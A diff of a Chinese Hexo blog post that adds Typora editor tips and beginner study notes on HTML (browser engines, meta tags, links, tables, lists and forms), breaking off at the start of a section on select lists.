@@ -93,20 +93,3094 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h2 id="Typora是什么？"><a href="#Typora是什么？" class="headerlink" title="Typora是什么？"></a>Typora是什么？</h2><p>我觉得还是很有必要了解一下，毕竟要用它来写博客，要记录的</p>
+        <h2 id="Typora是什么？">Typora是什么？</h2>
+<p>[TOC]</p>
+<p>我觉得还是很有必要了解一下，毕竟要用它来写博客，要记录的</p>
 <p>1.它可以支持实时预览Markdown的文本编辑器，使用过程还完全免费。它是用来编写结构化文档的一种纯文本格式</p>
-<p>2.Markdown语法有很多，认可比较广泛的是GFM标准。设置方式：点击文件—偏好设置—Markdown语法编号—严格模式—-重启后即可</p>
-<h2 id="图片插入："><a href="#图片插入：" class="headerlink" title="图片插入："></a>图片插入：</h2><p>有其他博主说可以自己把图片复制在这里面就可以了，但是我这样做了后，在Hexo里面看不见图片，跟着以下步骤就可以直接复制图片了</p>
-<p>在插入图片前：这样设置：先在Blog的source里面建立一个新的文件夹images,然后回到Typora,打开文件—偏好设置—-图像—插入图片的路径—选择路径就是刚刚建立的那个文件夹，建立好后，当你在用Typora写内容需要添加图片时，在头部加这点击格式—图像—设置图片根目录—选择上面建立的文件夹就看可以了。设置好后，文档头部是这样的：title: Typor的使用<br>date: 2022-03-28 10:00:04<br>tags:<br>typora-root-url: ..\images     //这个就是刚刚设置的（当你重新写一篇内容的时候，你都要这样设置一次）</p>
-<h2 id="空格与换行："><a href="#空格与换行：" class="headerlink" title="空格与换行："></a>空格与换行：</h2><p>1.如果你需要空格，在Typora里面可以自己点击空格，但是当去网站看到的时候，空格又不见了，所以你可以这样做：在源代码(点击typora下面的（&lt;/&gt;）这个图标)模式下，每个空格前加一个\转义符，或者直接使用HTML风格&amp;nbps来保持连续空格</p>
-<p>2.软换行：shift+Enter （就是隔了一个空格）<br>硬换行:空格+空格+shift+Enter （换了一行）<br>换段：Enter （换了两行）</p>
-<h2 id="emoji表情："><a href="#emoji表情：" class="headerlink" title="emoji表情："></a>emoji表情：</h2><p>打出：（:emoji）:eg :face_with_thermometer:</p>
-<h3 id="LaTeX：用于快速生成复杂的表格和数学公式"><a href="#LaTeX：用于快速生成复杂的表格和数学公式" class="headerlink" title="LaTeX：用于快速生成复杂的表格和数学公式"></a>LaTeX：用于快速生成复杂的表格和数学公式</h3><p>1.</p>
+<p>2.Markdown语法有很多，认可比较广泛的是GFM标准。设置方式：点击文件—偏好设置—Markdown语法编号—严格模式----重启后即可</p>
+<h2 id="图片插入：">图片插入：</h2>
+<p>有其他博主说可以自己把图片复制在这里面就可以了，但是我这样做了后，在Hexo里面看不见图片，跟着以下步骤就可以直接复制图片了</p>
+<p>在插入图片前：这样设置：先在Blog的source里面建立一个新的文件夹images,然后回到Typora,打开文件—偏好设置----图像—插入图片的路径—选择路径就是刚刚建立的那个文件夹，建立好后，当你在用Typora写内容需要添加图片时，在头部加这点击格式—图像—设置图片根目录—选择上面建立的文件夹就看可以了。设置好后，文档头部是这样的：title: Typor的使用<br>
+date: 2022-03-28 10:00:04<br>
+tags:<br>
+typora-root-url: …\images     //这个就是刚刚设置的（当你重新写一篇内容的时候，你都要这样设置一次）</p>
+<h2 id="空格与换行：">空格与换行：</h2>
+<p>1.如果你需要空格，在Typora里面可以自己点击空格，但是当去网站看到的时候，空格又不见了，所以你可以这样做：在源代码(点击typora下面的（&lt;/&gt;）这个图标)模式下，每个空格前加一个\转义符，或者直接使用HTML风格&amp;nbps来保持连续空格</p>
+<p>2.软换行：shift+Enter （就是隔了一个空格）<br>
+硬换行:空格+空格+shift+Enter （换了一行）<br>
+换段：Enter （换了两行）</p>
+<h2 id="emoji表情：">emoji表情：</h2>
+<p>打出：（:emoji）:eg :face_with_thermometer:</p>
+<h3 id="LaTeX：用于快速生成复杂的表格和数学公式">LaTeX：用于快速生成复杂的表格和数学公式</h3>
+<p>1.行内公式：用 $…$扩起公式<br>
+2.块间公式：用$$…$$，注意$$后要换行，公式会默认在中间</p>
+<h2 id="代码高亮：">代码高亮：</h2>
+<p>1.行内代码：用’…‘或者&quot;…&quot;扩起代码，<br>
+2.代码块：输入’''后输入语言名，换行即可</p>
+<h2 id="快捷键">快捷键</h2>
+<p>下划线：Ctrl+U<br>
+放大：Ctrl+Shift+=<br>
+缩小：Ctrl+Shift±<br>
+跳到顶部：ctrl+Home<br>
+表：ctrl+T</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>代码围栏:Ctrl + Shift + k</p>
+<p><strong>「学习笔记」<strong><strong>HTML</strong></strong>基础</strong></p>
+<p><strong>前言</strong></p>
+<p>勤做笔记不仅可以让自己学的扎实，更重要的是可以让自己少走弯路。有人说:“再次翻开笔记是什么感觉”，我的回答是:“初恋般的感觉”。或许笔记不一定十全十美，但肯定会让你有种初恋般的怦然心动。💖💖<br>
+本章着重复习Html的基础内容，学习Html究竟要学些什么呢？主要是学习各种标签，来搭建网页的“结构”。✨✨<br>
+本篇文章主要由五个章节构成，从WEB标准到初识HTML，接着学习HTML常用标签，最后学习表格列表和表单。💪💪开始充电之旅啦~~~</p>
+<p><strong>一、认识****WEB</strong></p>
+<p><strong>「网页」<strong>主要是由</strong>文字</strong>、<strong>图像</strong>和<strong>超链接</strong>等元素构成，当然除了这些元素，网页中还可以包括音频、视频以及Flash等。</p>
+<p>**「浏览器」**是网页显示、运行的平台。</p>
+<p><strong>「浏览器内核」</strong>(排版引擎、解释引擎、渲染引擎)</p>
+<p>负责读取网页内容，整理讯息，计算网页的显示方式并显示页面。</p>
+<table>
+<thead>
+<tr>
+<th><strong>浏览器</strong></th>
+<th><strong>内核</strong></th>
+<th><strong>备注</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IE</td>
+<td>Trident</td>
+<td>IE、猎豹安全、360极速浏览器、百度浏览器</td>
+</tr>
+<tr>
+<td>firefox</td>
+<td>Gecko</td>
+<td>可惜这几年已经没落了，打开速度慢、升级频繁、猪一样的队友flash、神一样的对手chrome。</td>
+</tr>
+<tr>
+<td>Safari</td>
+<td>webkit</td>
+<td>现在很多人错误地把 webkit 叫做 chrome内核（即使 chrome内核已经是 blink 了）。苹果感觉像被别人抢了媳妇，都哭晕在厕所里面了。</td>
+</tr>
+<tr>
+<td>chrome</td>
+<td>Chromium/Blink</td>
+<td>在 Chromium 项目中研发 Blink 渲染引擎（即浏览器核心），内置于 Chrome 浏览器之中。Blink 其实是 WebKit 的分支。大部分国产浏览器最新版都采用Blink内核。二次开发</td>
+</tr>
+<tr>
+<td>Opera</td>
+<td>blink</td>
+<td>现在跟随chrome用blink内核。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Web****标准</strong></p>
+<p>**「构成」**👉 <strong>结构标准，表现标准和行为标准</strong></p>
+<ul>
+<li><strong>结构标准</strong>用于对网页元素进行整理和分类(HTML)</li>
+<li><strong>表现标准</strong>用于设置网页元素的版式、颜色、大小等外观属性(CSS)</li>
+<li><strong>行为标准</strong>用于对网页模型的定义及交互的编写(JavaScript)</li>
+</ul>
+<p>**「<strong><strong>Web</strong></strong>标准的优点」**👇</p>
+<ul>
+<li><strong>易于维护</strong>：只需更改CSS文件，就可以改变整站的样式</li>
+<li><strong>页面响应快</strong>：HTML文档体积变小，响应时间短</li>
+<li><strong>可访问性</strong>：语义化的HTML（结构和表现相分离的HTML）编写的网页文件，更容易被屏幕阅读器识别</li>
+<li><strong>设备兼容性</strong>：不同的样式表可以让网页在不同的设备上呈现不同的样式</li>
+<li><strong>搜索引擎</strong>：语义化的HTML能更容易被搜索引擎解析，提升排名</li>
+</ul>
+<p><strong>二、<strong><strong>HTML</strong></strong>初识</strong></p>
+<p><strong>HTML****初识</strong></p>
+<p><strong>「<strong><strong>HTML</strong></strong>」</strong>(Hyper Text Markup Language):超文本标记语言</p>
+<p><strong>「所谓超文本，有<strong><strong>2</strong></strong>层含义：」</strong></p>
+<ul>
+<li>因为它可以加入图片、声音、动画、多媒体等内容**（超越文本限制** <strong>）</strong></li>
+<li>不仅如此，它还可以从一个文件跳转到另一个文件，与世界各地主机的文件连接**（超级链接文本）**。</li>
+</ul>
+<p><strong>「<strong><strong>HTML</strong></strong>骨架格式」</strong></p>
+<!-- 页面中最大的标签 根标签 -->
+ <html>
+   <!-- 头部标签 -->
+   <head>   
+     <!-- 标题标签 -->
+     <title></title> 
+   </head>
+   <!-- 文档的主体 -->
+   <body>
+   </body>
+ </html>
+<p><strong>「团队约定大小写」</strong></p>
+<ul>
+<li>HTML标签名、类名、标签属性和大部分属性值统一用小写</li>
+</ul>
+<p><strong>「<strong><strong>HTML</strong></strong>元素标签分类」</strong></p>
+<ul>
+<li>常规元素(双标签)</li>
+<li>空元素(单标签)</li>
+</ul>
+<p>常规元素(双标签)<br>
+&lt;标签名&gt; 内容 &lt;/标签名&gt;  比如<body>我是文字</body></p>
+<p>空元素(单标签)<br>
+&lt;标签名 /&gt; 比如 <br />或<br></p>
+<p><strong>「<strong><strong>HTML</strong></strong>标签关系」</strong></p>
+<ul>
+<li>
+<p><strong>嵌套关系</strong>父子级包含关系</p>
+</li>
+<li>
+<p><strong>并列关系</strong>兄弟级并列关系</p>
+</li>
+<li>
+<ul>
+<li>如果两个标签之间的关系是<strong>嵌套关系</strong>，子元素最好缩进一个tab键的身位（一个tab是4个空格）。如果是<strong>并列关系</strong>，最好上下对齐。</li>
+</ul>
+</li>
+</ul>
+<p><strong>文档类型</strong>**<!DOCTYPE >**</p>
+<p>**「文档类型」<strong>用来说明你用的XHTML或者HTML是什么版本。</strong><!DOCTYPE html>**告诉浏览器按照HTML5标准解析页面。</p>
+<p><strong>页面语言****lang</strong></p>
+<p><strong>lang</strong>指定该html标签内容所用的语言</p>
+ <html lang="en"> 
+  en 定义语言为英语 zh-CN定义语言为中文
+<p><strong>「<strong><strong>lang</strong></strong>的作用」</strong></p>
+<ul>
+<li>根据根据lang属性来设定不同语言的css样式，或者字体</li>
+<li>告诉搜索引擎做精确的识别</li>
+<li>让语法检查程序做语言识别</li>
+<li>帮助翻译工具做识别</li>
+<li>帮助网页阅读程序做识别</li>
+</ul>
+<p><strong>字符集</strong></p>
+<p><strong>「字符集」</strong>(Character set)是多个字符的集合,计算机要准确的处理各种字符集文字，需要进行字符编码，以便计算机能够识别和存储各种文字。</p>
+<ul>
+<li>
+<p>UTF-8是目前最常用的字符集编码方式</p>
+</li>
+<li>
+<p>让 html 文件是以 UTF-8 编码保存的， 浏览器根据编码去解码对应的html内容。</p>
+<meta charset="UTF-8" />
+</li>
+</ul>
+<p><strong>「<strong><strong>meta viewport</strong></strong>的用法」</strong><br>
+通常viewport是指视窗、视口。浏览器上(也可能是一个app中的webview)用来显示网页的那部分区域。在移动端和pc端视口是不同的，pc端的视口是浏览器窗口区域，而在移动端有三个不同的视口概念：布局视口、视觉视口、理想视口</p>
+<p>meta有两个属性name 和 http-equiv</p>
+<p><strong>name****属性的取值</strong></p>
+<ul>
+<li>keywords(关键字) 告诉搜索引擎，该网页的关键字</li>
+<li>description(网站内容描述) 用于告诉搜索引擎，你网站的主要内容。</li>
+<li>viewport(移动端的窗口)</li>
+<li>robots(定义搜索引擎爬虫的索引方式)     robots用来告诉爬虫哪些页面需要索引，哪些页面不需要索引</li>
+<li>author(作者)</li>
+<li>generator(网页制作软件）</li>
+<li>copyright(版权)</li>
+</ul>
+<p><strong>http-equiv****有以下参数</strong></p>
+<p><strong>http-equiv</strong>相当于http的文件头作用，它可以向浏览器传回一些有用的信息，以帮助正确和精确地显示网页内容</p>
+<ul>
+<li><strong>content-Type</strong> 设定网页字符集(Html4用法，不推荐)</li>
+<li><strong>Expires(<strong><strong>期限</strong></strong>)</strong> ,可以用于设定网页的到期时间。一旦网页过期，必须到服务器上重新传输。</li>
+<li><strong>Pragma(cache<strong><strong>模式</strong></strong>)</strong>,是用于设定禁止浏览器从本地机的缓存中调阅页面内容，设定后一旦离开网页就无法从Cache中再调出</li>
+<li><strong>Refresh(<strong><strong>刷新</strong></strong>)</strong>,自动刷新并指向新页面。</li>
+<li><strong>cache-control</strong>（请求和响应遵循的缓存机制）</li>
+</ul>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<p><strong>HTML****标签的语义化</strong></p>
+<ul>
+<li>方便代码的阅读和维护，样式丢失的时候能让页面呈现清晰的结构。</li>
+<li>有利于SEO，搜索引擎根据标签来确定上下文和各个关键字的权重。</li>
+<li>方便其他设备解析，如盲人阅读器根据语义渲染网页</li>
+</ul>
+<p><strong>「拓展」</strong> 标签：规定页面上所有链接的默认 URL 和设置整体链接的打开状态</p>
+<head>
+   <base href="http://www.baidu.com" target="_blank">
+   <base target="_self">
+ </head>
+ <body>
+   <a href="">测试</a> 跳转到 百度
+ </body>
+<p><strong>HTML****常用标签</strong></p>
+<p><strong>常用标签</strong></p>
+<p>**「**<strong>1.</strong> **排版标签」**主要和css搭配使用，显示网页结构的标签，是网页布局最常用的标签。</p>
+<ul>
+<li>标题标签h(h1~h6)</li>
+<li>段落标签p,可以把 HTML 文档分割为若干段落</li>
+<li>水平线标签hr</li>
+<li>换行标签br</li>
+<li>div和span标签:是没有语义的,是我们网页布局最主要的2个盒子。</li>
+</ul>
+<p>**「**<strong>2.</strong> <strong>排版标签」</strong></p>
+<ul>
+<li><strong>b</strong>和<strong>strong</strong> 文字以粗体显示</li>
+<li><strong>i</strong>和<strong>em</strong> 文字以斜体显示</li>
+<li><strong>s</strong>和<strong>del</strong> 文字以加删除线显示</li>
+<li><strong>u</strong>和<strong>ins</strong> 文字以加下划线显示</li>
+</ul>
+<p><strong>「<strong><strong>3.</strong> <strong>标签属性</strong></strong>(<strong><strong>行内式</strong></strong>)****」</strong></p>
+<p>使用HTML制作网页时，如果想让HTML标签提供更多的信息，可以使用HTML标签的属性加以设置。</p>
+<p>&lt;标签名 属性1=“属性值1” 属性2=“属性值2” …&gt; 内容 &lt;/标签名&gt;<br>
+&lt;手机 颜色=“红色” 大小=“5寸”&gt; &lt;/手机&gt;</p>
+<p><strong>「<strong><strong>4.</strong> **图像标签</strong><strong>img</strong></strong>」**</p>
+<p><img src="../images/clip_image002.jpg" alt="图片"><strong>注意：</strong></p>
+<ul>
+<li>标签可以拥有多个属性，必须写在开始标签中，位于标签名后面。</li>
+<li>属性之间不分先后顺序，标签名与属性、属性与属性之间均以空格分开。</li>
+<li>采取  键值对 的格式       key=“value”  的格式</li>
+</ul>
+<img src="cz.jpg" width="300" height="300" border="3" title="这是个小蒲公英" />
+<p><strong>「<strong><strong>5.</strong> <strong>链接标签</strong></strong>(<strong><strong>重点</strong></strong>)****」</strong></p>
+<p><a href="跳转目标" target="目标窗口的弹出方式">文本或图像</a> target=“_self”  默认窗口弹出方式 target=“_blank” 新窗口弹出</p>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>href</td>
+<td>用于指定链接目标的url地址，（必须属性）当为标签应用href属性时，它就具有了超链接的功能</td>
+</tr>
+<tr>
+<td>target</td>
+<td>用于指定链接页面的打开方式，其取值有_self和_blank两种，其中_self为默认值，_blank为在新窗口中打开方式。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>src</strong> <strong>和</strong> <strong>href</strong> <strong>的区别</strong></p>
+<p>一句话概括:<strong>src</strong> <strong>是引入资源的</strong> <strong>href</strong> <strong>是跳转<strong><strong>url</strong></strong>的</strong></p>
+<ol>
+<li>src用于替换当前元素，href用于在当前文档和引用资源之间确立联系。</li>
+<li>src是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素。当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。</li>
+<li>href是Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接。如果我们在文档中添加那么浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用link方式来加载css，而不是使用@import方式。</li>
+</ol>
+<p><strong>注意：</strong></p>
+<ol>
+<li>外部链接 需要添加     http:// <a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a></li>
+<li>内部链接 直接链接内部页面名称即可 比如 &lt; a     href=“index.html”&gt; 首页</li>
+<li>如果当时没有确定链接目标时，通常将链接标签的href属性值定义为“#”(即href=“#”)，表示该链接暂时为一个空链接。</li>
+<li>不仅可以创建文本超链接，在网页中各种网页元素，如图像、表格、音频、视频等都可以添加超链接。</li>
+</ol>
+<p><strong>锚点定位：通过创建锚点链接，用户能够快速定位到目标内容。</strong></p>
+<p>\1. 使用相应的id名标注跳转目标的位置。 (找目标)</p>
+  <h3 id="two">第2集</h3> 
+<p>\2. 使用<a href="#id名">链接文本</a>创建链接文本（被点击的）<br>
+<a href="#two"></p>
+<p>**「**<strong>6.</strong> <strong>注释标签」</strong></p>
+ <!-- 注释语句 -->   
+<p>快捷键是：  ctrl + /<br>
+或者 ctrl +shift + /</p>
+<p>**团队约定：**注释内容前后各一个空格字符，注释位于要注释代码的上面，单独占一行</p>
+<p>**「**<strong>7.</strong> <strong>路径」</strong></p>
+<p><img src="../images/clip_image004.png" alt="图片">**「**<strong>8.</strong> <strong>其他知识」</strong></p>
+<p><strong>预格式化文本<strong><strong>pre</strong></strong>标签</strong>元素中的文本通常会保留空格和换行符。而文本也会呈现为等宽字体。格式化文本就是 ，按照我们预先写好的文字格式来显示页面， 保留空格和换行等。</p>
+<p><strong>特殊字符</strong><img src="../images/clip_image006.jpg" alt="图片"><strong>什么是****XHTML</strong></p>
+<ul>
+<li>XHTML 指**「可扩展超文本标签语言」**（EXtensible     HyperText Markup Language）。</li>
+<li>XHTML 的目标是取代 HTML。</li>
+<li>XHTML 与 HTML 4.01 几乎是相同的。</li>
+<li>XHTML 是更严格更纯净的 HTML 版本。</li>
+<li>XHTML 是作为一种 XML 应用被重新定义的     HTML,是严格版本的HTML。例如它要求标签必须小写，标签必须被正确关闭，标签顺序必须正确排列，对于属性都必须使用双引号等。</li>
+<li>XHTML 是一个 W3C 标准。</li>
+</ul>
+<p><strong>写<strong><strong>HTML</strong></strong>代码时应注意什么？</strong></p>
+<ul>
+<li>尽可能少的使用无语义的标签div和span；</li>
+<li>在语义不明显时，既可以使用div或者p时，尽量用p, 因为p在默认情况下有上下间距，对兼容特殊终端有利；</li>
+<li>不要使用纯样式标签，如：b、font、u等，改用css设置。</li>
+<li>需要强调的文本，可以包含在strong或者em标签中（浏览器预设样式，能用CSS指定就不用他们），strong默认样式是加粗（不要用b），em是斜体（不用i）；</li>
+<li>使用表格时，标题要用<strong>caption</strong>，表头用thead，主体部分用tbody包围，尾部用tfoot包围。表头和一般单元格要区分开，表头用th，单元格用td；</li>
+<li>表单域要用<strong>fieldset</strong>标签包起来，并用<strong>legend</strong>标签说明表单的用途；</li>
+<li>每个input标签对应的说明文本都需要使用<strong>label****标签</strong>，并且通过为input设置id属性，在lable标签中设置for来让说明文本和相对应的input关联起来。</li>
+</ul>
+<p><strong>表格</strong></p>
+<p>**「**<strong>1.</strong> <strong>表格」</strong></p>
+<p>现在还是较为常用的一种标签，但不是用来布局，**常见显示、展示表格式数据。**因为它可以让数据显示的非常的规整，可读性非常好。<strong>特别是后台展示数据的时候表格运用是否熟练就显得很重要</strong>，一个清爽简约的表格能够把繁杂的数据表现得很有条理。</p>
+<p>**「**<strong>2.</strong> <strong>创建表格」</strong></p>
+<table>   <tr>     <td>单元格内的文字</td>     ...   </tr>   ... </table>
+<p><strong>table</strong>**、<strong><strong>tr</strong></strong>、<strong><strong>td</strong></strong>，**他们是创建表格的基本标签，缺一不可</p>
+<ul>
+<li>table用于定义一个表格标签。</li>
+<li>tr标签 用于定义表格中的行，必须嵌套在     table标签中。</li>
+<li>td 用于定义表格中的单元格，必须嵌套在<tr></tr>标签中。</li>
+<li>字母 td 指表格数据（table     data），即数据单元格的内容，现在我们明白，表格最合适的地方就是用来存储数据的。td像一个容器，可以容纳所有的元素。<img src="../images/clip_image008.jpg" alt="图片"></li>
+</ul>
+<p><strong>表头单元格标签****th</strong>:一般表头单元格位于表格的第一行或第一列，并且文本加粗居中,只需用表头标签<th></th>替代相应的单元格标签<td></td>即可。</p>
+<p><img src="../images/clip_image010.png" alt="图片"></p>
+<p><strong>表格标题****caption</strong>通常这个标题会被居中且显示于表格之上。caption 标签必须紧随 table 标签之后。这个标签只存在 表格里面才有意义。你是风儿我是沙</p>
+<table>    <caption>我是表格标题</caption> </table>
+<p>**「**<strong>3.</strong> <strong>表格属性」</strong></p>
+<p><img src="../images/clip_image012.jpg" alt="图片">三参为0，平时开发的我们这三个参数   <strong>border  cellpadding  cellspacing</strong> 为  0</p>
+<p>**「**<strong>4.</strong> <strong>合并单元格」</strong>,合并的顺序我们按照  <strong>先上</strong> <strong>后下</strong>   <strong>先左</strong>  <strong>后右</strong> 的顺序 ,合并完之后需要删除多余的单元格。</p>
+<ul>
+<li>跨行合并：rowspan=“合并单元格的个数”</li>
+<li>跨列合并：colspan=“合并单元格的个数”</li>
+</ul>
+<p>**「**<strong>5.</strong> <strong>总结表格」</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>标签名</strong></th>
+<th><strong>定义</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><table></table></td>
+<td>表格标签</td>
+<td>就是一个四方的盒子</td>
+</tr>
+<tr>
+<td><tr></tr></td>
+<td>表格行标签</td>
+<td>行标签要再table标签内部才有意义</td>
+</tr>
+<tr>
+<td><td></td></td>
+<td>单元格标签</td>
+<td>单元格标签是个容器级元素，可以放任何东西</td>
+</tr>
+<tr>
+<td><th></th></td>
+<td>表头单元格标签</td>
+<td>它还是一个单元格，但是里面的文字会居中且加粗</td>
+</tr>
+<tr>
+<td><caption></caption></td>
+<td>表格标题标签</td>
+<td>表格的标题，跟着表格一起走，和表格居中对齐</td>
+</tr>
+<tr>
+<td>clospan 和 rowspan</td>
+<td>合并属性</td>
+<td>用来合并单元格的</td>
+</tr>
+</tbody>
+</table>
+<p>**「**<strong>6.</strong> <strong>表格划分结构」</strong></p>
+<p>对于比较复杂的表格，表格的结构也就相对的复杂了，所以又将表格分割成三个部分：题头、正文和脚注。而这三部分分别用:thead,tbody,tfoot来标注， 这样更好的分清表格结构。</p>
+<p><strong>注意：</strong><br>
+1.<thead></thead>：用于定义表格的头部。用来放标题之类的东西。<thead> 内部必须拥有<tr> 标签！<br>
+\2. <tbody></tbody>：用于定义表格的主体。放数据本体 。<br>
+\3. <tfoot></tfoot>放表格的脚注之类。<br>
+\4. 以上标签都是放到table标签中。</p>
+<p><strong>列表</strong></p>
+<p>**「列表<strong><strong>ul</strong></strong>」**容器里面装载着结构，样式一致的文字或图表的一种形式，叫列表。</p>
+<p>列表最大的特点就是整齐 、整洁、 有序，跟表格类似，但是它可组合自由度会更高。</p>
+<p><strong>「<strong><strong>1.</strong> <strong>无序列表</strong> <strong>ul</strong></strong>」</strong></p>
+<ul>
+<li>
+<ul></ul>中只能嵌套<li></li>，直接在<ul></ul>标签中输入其他标签或者文字的做法是不被允许的。
+</li>
+<li>
+<li>与</li>之间相当于一个容器，可以容纳所有元素。
+</li>
+</ul>
+<ul>
+  <li>列表项1</li>
+  <li>列表项2</li>
+  <li>列表项3</li>
+  ......
+ </ul>
+<p><strong>「<strong><strong>2.</strong> <strong>有序列表</strong> <strong>ol</strong></strong>」</strong></p>
+<ul>
+<li>
+<ol>标签中的type属性值为排序的序列号，不添加type属性时，有序列表默认从数字1开始排序。
+</li>
+<li>常用的type属性值分别为是1，a，A，i，I</li>
+<li>
+<ol reversed="reversed">中的reversed属性能够让有序列表中的序列倒序排列。
+</li>
+<li>
+<ol start="3">中的start属性值为3，有序列表中的第一个序列号将从3开始排列。
+</li>
+</ul>
+<ol type="A"> 
+  <li>列表项1</li>
+  <li>列表二</li>
+  <li>列表三</li>
+ </ol>
+<p><strong>「<strong><strong>2.</strong> <strong>自定义列表</strong> <strong>dl</strong></strong>」</strong></p>
+<ul>
+<li>定义列表常用于对术语或名词进行解释和描述，定义列表的列表项前没有任何项目符号。</li>
+</ul>
+<dl>   <dt>名词1</dt>   <dd>名词1解释1</dd>   <dd>名词1解释2</dd>   ...   <dt>名词2</dt>   <dd>名词2解释1</dd>   <dd>名词2解释2</dd>   ... </dl>
+<p><img src="../images/clip_image014.png" alt="图片"></p>
+<p><strong>表单</strong></p>
+<p>在HTML中，一个完整的表单通常由<strong>表单控件</strong>（也称为表单元素）、<strong>提示信息</strong>和<strong>表单域</strong>3个部分构成。表单目的是为了收集用户信息。</p>
+<p><img src="../images/clip_image016.png" alt="图片"><strong>表单控件：</strong><br>
+包含了具体的表单功能项，如单行文本输入框、密码输入框、复选框、提交按钮、重置按钮等。<br>
+<strong>提示信息：</strong><br>
+一个表单中通常还需要包含一些说明性的文字，提示用户进行填写和操作。<br>
+<strong>表单域：</strong><br>
+它相当于一个容器，用来容纳所有的表单控件和提示信息，可以通过他定义处理表单数据所用程序的url地址，以及数据提交到服务器的方法。如果不定义表单域，表单中的数据就无法传送到后台服务器。</p>
+<p>**「**<strong>1. input</strong> <strong>控件」</strong></p>
+<input type="属性值" value="你好">
+<ul>
+<li>input 输入的意思</li>
+<li><input />标签为单标签</li>
+<li>type属性设置不同的属性值用来指定不同的控件类型</li>
+<li>除了type属性还有别的属性</li>
+</ul>
+<p><strong>常用属性：</strong></p>
+<p><img src="../images/clip_image018.jpg" alt="图片"></p>
+<p>用户名: <input type="text" /><br>
+密 码：<input type="password" /></p>
+<p><strong>value****属性</strong></p>
+<ul>
+<li>value 默认的文本值。有些表单想刚打开页面就默认显示几个文字，就可以通过这个value     来设置。</li>
+</ul>
+<p>用户名:<input type="text" name="username" value="请输入用户名"></p>
+<p><strong>name****属性</strong></p>
+<ul>
+<li>
+<p>name表单的名字， 这样，后台可以通过这个name属性找到这个表单。 页面中的表单很多，name主要作用就是用于区别不同的表单。</p>
+</li>
+<li>
+<ul>
+<li>name属性后面的值，是我们自己定义的。</li>
+<li>radio  如果是一组，我们必须给他们命名相同的名字 name       这样就可以多个选其中的一个啦</li>
+<li>name属性，我们现在用的较少，但是，当我们学ajax 和后台的时候，是必须的。</li>
+</ul>
+</li>
+</ul>
+<p><input type="radio" name="sex" />男<br>
+<input type="radio" name="sex" />女</p>
+<p><strong>checked****属性</strong></p>
+<ul>
+<li>表示默认选中状态。 较常见于 单选按钮和复选按钮。</li>
+</ul>
+<p>性  别:<br>
+<input type="radio" name="sex" value="男" checked="checked" />男<br>
+<input type="radio" name="sex" value="女" />女</p>
+<p><strong>input</strong> <strong>属性小结</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>type</td>
+<td>表单类型</td>
+<td>用来指定不同的控件类型</td>
+</tr>
+<tr>
+<td>value</td>
+<td>表单值</td>
+<td>表单里面默认显示的文本</td>
+</tr>
+<tr>
+<td>name</td>
+<td>表单名字</td>
+<td>页面中的表单很多，name主要作用就是用于区别不同的表单。</td>
+</tr>
+<tr>
+<td>checked</td>
+<td>默认选中</td>
+<td>表示那个单选或者复选按钮一开始就被选中了</td>
+</tr>
+</tbody>
+</table>
+<p><strong>「<strong><strong>2.  label</strong></strong>标签」</strong></p>
+<ul>
+<li>label 标签为 input 元素定义标注（标签）。</li>
+<li>label标签主要目的是为了提高用户体验。为用户提高最优秀的服务。</li>
+</ul>
+<p>**作用：**用于绑定一个表单元素, 当点击label标签的时候, 被绑定的表单元素就会获得输入焦点。</p>
+<p><strong>如何绑定元素呢</strong></p>
+<ul>
+<li>第一种用法就是用label标签直接包含input表单， 适合单个表单选择</li>
+<li>第二种用法 for 属性规定 label 与哪个表单元素绑定(通过id)。</li>
+</ul>
+<p>第一种<br>
+<label> 用户名：<br>
+<input type="radio" name="usename" value="请输入用户名"><br>
+</label></p>
+<p>第二种<br>
+<label for="sex">男</label><br>
+<input type="radio" name="sex" id="sex"></p>
+<p><strong>「<strong><strong>3.  textarea</strong></strong>控件</strong>**(<strong><strong>文本域</strong></strong>)****」**</p>
+<ul>
+<li>通过textarea控件可以轻松地创建多行文本输入框.</li>
+<li>cols=“每行中的字符数” rows=“显示的行数”      我们实际开发不用</li>
+</ul>
+<p><img src="../images/clip_image020.jpg" alt="图片"></p>
+ <textarea >
+   文本内容
+  </textarea>
+<p><strong>文本框和文本域区别</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>表单</strong></th>
+<th><strong>名称</strong></th>
+<th><strong>区别</strong></th>
+<th><strong>默认值显示</strong></th>
+<th><strong>用于场景</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>input type=“text”</td>
+<td>文本框</td>
+<td>只能显示一行文本</td>
+<td>单标签，通过value显示默认值</td>
+<td>用户名、昵称、密码等</td>
+</tr>
+<tr>
+<td>textarea</td>
+<td>文本域</td>
+<td>可以显示多行文本</td>
+<td>双标签，默认值写到标签中间</td>
+<td>留言板</td>
+</tr>
+</tbody>
+</table>
+<p><strong>「<strong><strong>4.  select</strong></strong>下拉列表」</strong></p>
+<ul>
